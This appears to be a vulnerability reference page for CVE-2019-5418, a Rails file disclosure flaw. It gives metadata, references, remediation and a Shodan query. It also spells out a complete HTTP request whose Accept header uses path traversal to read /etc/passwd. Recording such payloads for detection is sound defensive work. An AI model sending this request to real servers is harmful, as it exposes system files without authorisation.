---
layout: "post"
cve_id: "CVE-2019-5418"
title: "Rails File Content Disclosure"
pcap: true
pcap_path: "/pcaps/2019/CVE-2019-5418.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2019/CVE-2019-5418.yaml"
author: "omarkurt"
severity: "high"
impact: "This vulnerability can lead to unauthorized access to sensitive information stored on the server.
"
remediation: "Apply the patch provided by the Rails team or upgrade to a version that includes the fix.
"
reference:
  - "https://github.com/omarkurt/CVE-2019-5418"
  - "https://weblog.rubyonrails.org/2019/3/13/Rails-4-2-5-1-5-1-6-2-have-been-released/"
  - "https://nvd.nist.gov/vuln/detail/CVE-2019-5418"
  - "https://www.exploit-db.com/exploits/46585/"
  - "http://lists.opensuse.org/opensuse-security-announce/2019-05/msg00011.html"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N', 'cvss-score': 7.5, 'cve-id': 'CVE-2019-5418', 'cwe-id': 'CWE-22,NVD-CWE-noinfo', 'epss-score': 0.94336, 'epss-percentile': 0.99951, 'cpe': 'cpe:2.3:a:rubyonrails:rails:*:*:*:*:*:*:*:*'}"
metadata: "{'max-request': 1, 'vendor': 'rubyonrails', 'product': 'rails', 'shodan-query': 'cpe:"cpe:2.3:a:rubyonrails:rails"'}"
tags:
  - "cve"
  - "cve2019"
  - "rails"
  - "lfi"
  - "disclosure"
  - "edb"
  - "rubyonrails"
  - "kev"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
Rails <5.2.2.1, <5.1.6.2, <5.0.7.2, <4.2.11.1 and v3 are susceptible to a file content disclosure vulnerability because specially crafted accept headers can cause contents of arbitrary files on the target system's file system to be exposed.

## üåê HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) ConnectPC Safari/537.36 Browser
Connection: close
Accept: ../../../../../../../../etc/passwd{{
Accept-Language: en
Accept-Encoding: gzip
```

